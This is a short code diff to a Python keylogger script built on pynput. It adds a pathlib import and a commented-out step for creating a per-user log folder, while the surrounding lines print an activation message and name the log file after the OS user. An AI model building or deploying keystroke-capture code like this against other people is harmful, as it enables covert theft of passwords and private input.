@@ -4,6 +4,7 @@
 # 20 Oct. 2022
 
 from pynput import keyboard
+from pathlib import Path
 import getpass
 from datetime import datetime
 
@@ -16,6 +17,9 @@ FILENAME = "keylogger_" + CURRENT_OS_USER + "_" + CURRENT_TIME_STRING
 
 # Starting message
 print("Keylogger activated.\nEverything will be saved in the folder logs under the name of :\n" + FILENAME)
+
+# Creating folder for logs if it does not exist and creating the text file
+# Path("/logs/" + CURRENT_OS_USER).mkdir(parents=True, exist_ok=True)
 
 # Print keys input in terminal (Later, in a text file)
 def on_pressing_key(key):
